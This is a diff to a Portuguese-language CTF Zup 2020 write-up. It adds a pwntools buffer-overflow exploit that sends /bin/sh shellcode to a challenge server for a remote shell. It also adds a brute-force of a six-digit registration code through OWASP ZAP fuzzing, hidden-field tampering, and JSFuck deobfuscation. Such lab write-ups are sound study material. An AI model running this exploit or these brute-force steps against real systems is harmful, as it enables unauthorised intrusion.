@@ -28,16 +28,16 @@ dos desafios do CTF Zup 2020, ou pelo menos aqueles que eu consegui resolver :ro
     - [Rotate](#rotate)
 5. [Pwns](pown/index)
     - [Pwn1](#pwn1)
-    - Pwn2
-    - Pwn3
-    - Pwn4
+    - [Pwn2](#pwn2)
+    - [Pwn3](#pwn3)
+    - [Pwn4](#pwn4)
 6. [Aplicações Web](web/index)
-    - Awesome cats
-    - Login bypass
-    - Easy one
-    - Easy two
-    - Fucking
-    - I hate flask
+    - [Awesome cats](#awesome-cats)
+    - [Login bypass](#login-bypass)
+    - [Easy one](#easy-one)
+    - [Easy two](#easy-two)
+    - [Fucking](#fucking)
+    - [I hate flask](#i-hate-flask)
     - LFI
     - Look Closer
     - Nice site
@@ -261,6 +261,31 @@ e se então nós escrevermos um código shell nesse endereço e então pular par
 O código python abaixo realiza exatamente essa função
 
 
+```python
+#!/usr/bin/env python3
+from pwn import *
+import re
+
+def getAddress(out):
+    memAddress = re.sub(r'(.*0x)(.{8})(.*)', r'\2', out.decode('utf-8')); #regex to extract memAddrs
+    return p32(int(memAddress, 16))
+
+if __name__ == '__main__':
+    e = remote("18.228.166.40", 4323)
+    out = e.recvline()
+    addr = getAddress(out)
+    print(("[+] Memory Address is: ").encode() + addr)
+
+    payload = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' # /bin/sh
+    payload +=b'A'*281 #causing the buffer overflow
+    payload += addr #finally set the address
+    print(e.sendline(payload))
+    e.interactive()
+```
+
+E como resultado agora temos acesso ao sh no servidor remoto, bastando então executar o cat flag.txt (o exemplo abaixo mostra um print em execução localhost)
+![Pwn 3 on localhost](https://github.com/leoplana/ctf-zup-2020/blob/master/pwn/pwn3-step1.png)
+
 
 ### Pwn4 ###
 Este desafio também nos dá um arquivo sem extensão alguma, e outra instrução shell
@@ -280,20 +305,59 @@ nos retornando como output o conteúdo de todos os arquivos da pasta, incluindo 
 
 ## Aplicações Web :globe_with_meridians:
 
+### Awesome Cats ###
+Este desafio nos apresenta um site aparentemente estático, cheio de gatos em todos os menus, ao inspecionar as páginas encontrei um comentário dentro da página cats-fat.html
+onde é mencionado um arquivo de 'to do'. A partir desse arquivo foi possível seguir uma trilha de dicas, para chegar na flag a trilha abaixo foi seguida
+
+```html
+http://54.94.193.248:12001/cats-fat.html <!-- Aqui encontrei a linha mencionando secret/todo.md -->
+.../todo.md <!-- Aqui encontrei um arquivo mencionando um todo 'estudar robots.txt' -->
+.../robots.txt <!-- O robots menciona o arquivo journal.md -->
+.../journal.md <!-- Finalmente nesse arquivo encontramos nossa flag! -->
+```
+
+### Login Bypass ###
+Este desafio nos apresenta uma página de login do qual desconhecemos o usuário e senha, porém nos apresenta também um menu para cadastro. Nesse menu, no entanto, é necessário um código numérico de 6 dígitos para permitir que façamos o cadastro. A página apresenta ainda um captcha mas que não é efetivo pois aparentemente não bloqueia as requisições.
+Para realizar então um ataque de força bruta e testar todas as possibilidades eu criei um arquivo .txt contendo todas as opções de código possíveis, executando para isso o javascript abaixo
+
+```javascript
+String.prototype.padZero= function(len, c){
+    var s= this, c= c || '0';
+    while(s.length< len) s= c+ s;
+    return s;
+}
+Array.from({ length: 1000000 }, (v, i) => i.toString().padZero(6).toString());
+```
+para realizar os testes com o código 000000 até 999999 utilizei a ferramenta [OWASP ZAP 2.9.0](#owasp-zap) bastou então executar uma tentativa manual e configurar o parâmetro 'código' para ser dinâmico a cada request (utilizando o recurso Fuzz), lendo do arquivo de texto criado acima. Em poucos minutos o cadastro estava efetivado, restando então fazer o login e pegar a flag.
+
+### Easy one ###
+Este desafio nos retorna uma página html aparentemente normal. A flag estava contida, na verdade, em um header chamado 'flag'. É possível ver mais facilmente utilizando a ferramenta [Postman](#postman)
+
+### Easy two ###
+Este desafio nos retorna uma página com um formulário de login. Ao inspecionar a página é possível ver um campo hidden aparentemente um booleano, ao trocar de 0 para 1 e submeter o formulário a flag é exibida. 
+
+### Fucking ###
+Este desafio também nos retorna uma página com um formulário de login, mas ao inspecionar é exibido um código javascript extremamente bizarro, composto somente pelos caracteres ([!+{}]). Ao procurar sobre esse tipo de código descubro que é chamado de Brainfuck, e encontro um desofuscador chamado [JSFuck Decoder](#js-fuck-decoder) bem útil, que em instantes conseguiu transformar o javascript em algo legível que exibia uma lógica bem simples, algo similar 
+```javascript
+if(document.getElementByName("username").value === "foo" && document.getElementByName("password").value === "bar")
+```
+colocando então os valores de usuário e senha no formulário a flag é exibida
+
+### I Hate Flask ###
 
 
 # Ferramentas #
 
 ### Android Studio ###
-IDE para desenvolvimento Android disponível neste [link](https://redirector.gvt1.com/edgedl/android/studio/install/4.1.0.19/android-studio-ide-201.6858069-windows.exe) 
+IDE para desenvolvimento Android disponível neste [link](#https://redirector.gvt1.com/edgedl/android/studio/install/4.1.0.19/android-studio-ide-201.6858069-windows.exe) 
 ### APK Decompilers ###
-Ferramenta online para decompilar apks disponível [em](https://www.apkdecompilers.com/)
+Ferramenta online para decompilar apks disponível [em](#https://www.apkdecompilers.com/)
 ### SQLite Browser ###
-Ferramenta para visualizar arquivos SQLite disponível [em](https://download.sqlitebrowser.org/DB.Browser.for.SQLite-3.12.0-win64.msi)
+Ferramenta para visualizar arquivos SQLite disponível [em](#https://download.sqlitebrowser.org/DB.Browser.for.SQLite-3.12.0-win64.msi)
 ### ADB ###
-Ferramenta cli para interagir/conectar com dispositivos Android via CMD disponível [em](https://dl.google.com/android/repository/platform-tools_r30.0.4-windows.zip)
+Ferramenta cli para interagir/conectar com dispositivos Android via CMD disponível [em](#https://dl.google.com/android/repository/platform-tools_r30.0.4-windows.zip)
 ### dCode ###
-Ferramenta online para decriptografia com vários algoritmos disponíveis bem como força bruta, disponível [em](https://www.dcode.fr/)
+Ferramenta online para decriptografia com vários algoritmos disponíveis bem como força bruta, disponível [em](#https://www.dcode.fr/)
 ### ILOVEPDF ###
 Ferramenta online que permite abrir pdfs criptografados, disponível no [link](#https://www.ilovepdf.com/unlock_pdf)
 ### HXD ###
@@ -319,3 +383,9 @@ apt-get install python3-pip
 Framework python voltado para CTF's disponível [em](#https://github.com/Gallopsled/pwntools)
 ### Docker ###
 Ferramenta de container que dispensa comentários disponível [em](#https://desktop.docker.com/win/stable/Docker%20Desktop%20Installer.exe)
+### OWASP ZAP ###
+Ferramenta muito robusta para pentest disponível [em](#https://github-production-release-asset-2e65be.s3.amazonaws.com/36817565/02bfc080-3941-11ea-809a-e1c3d98c36a5?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20201010%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20201010T113221Z&X-Amz-Expires=300&X-Amz-Signature=71713c9794adf65523b3f20aa1a25bd4e5e86b12fc14f1773f5769b5ddd1d8e2&X-Amz-SignedHeaders=host&actor_id=28098259&key_id=0&repo_id=36817565&response-content-disposition=attachment%3B%20filename%3DZAP_2_9_0_windows.exe&response-content-type=application%2Foctet-stream)
+### Postman ###
+Ferramenta para realizar requests Restful/automações de chamadas de API's disponível [em](#https://dl.pstmn.io/download/latest/win64)
+### JS Fucker Decoder ###
+Ferramenta para desofuscar um javascript 'fuck' disponível online [em](#https://enkhee-osiris.github.io/Decoder-JSFuck/)
